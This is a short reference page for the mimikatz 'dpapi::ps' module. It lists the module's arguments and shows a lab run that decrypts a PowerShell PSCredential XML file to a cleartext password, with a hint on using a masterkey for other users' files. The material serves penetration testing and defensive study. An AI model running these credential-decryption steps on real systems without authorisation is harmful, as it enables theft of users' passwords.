# ps

`dpapi::ps` decrypts PowerShell credentials (PSCredentials or SecureString). It has the following command line arguments:

* `/in`: the PowerShell credentials `.xml` file
* `/password`: the password to use to decrypt the PSCredentials
* `/masterkey`: the masterkey to use for decryption. It can be obtained through [`sekurlsa::dpapi`](https://tools.thehacker.recipes/mimikatz/modules/sekurlsa/dpapi).
* `/unprotect`: displays the decryption results on screen

```
mimikatz # dpapi::ps /in:ps_cred.xml /unprotect
UserName: hacklab\m3g9tr0n
Password: **BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : {5c22983f-77ee-41e4-9086-8073d664e417}
  dwFlags            : 00000000 - 0 ()
  dwDescriptionLen   : 00000002 - 2
  szDescription      :
  algCrypt           : 00006603 - 26115 (CALG_3DES)
  dwAlgCryptLen      : 000000c0 - 192
  dwSaltLen          : 00000010 - 16
  pbSalt             : ec2c6882a6414dbc02ef9635b417b405
  dwHmacKeyLen       : 00000000 - 0
  pbHmackKey         :
  algHash            : 00008004 - 32772 (CALG_SHA1)
  dwAlgHashLen       : 000000a0 - 160
  dwHmac2KeyLen      : 00000010 - 16
  pbHmack2Key        : fdf9251a5503f367cab65c6b13888556
  dwDataLen          : 00000018 - 24
  pbData             : 4dad0233039bd9a634fd1dc4ec89b1a83d0f000da752076c
  dwSignLen          : 00000014 - 20
  pbSign             : 2a8cd7071815f88bbb469b2839c52530baa1dd45

 * using CryptUnprotectData API
>> cleartext: Super_SecretPass1!
```

{% hint style="info" %}
In the example above, the `.xml` PSCredential file for decryption was previously created by the same user, hence the absence of the `/password` or `/masterkey` argument, which would be needed when attempting to decrypt `.xml` PSCredentials of a different user.
{% endhint %}
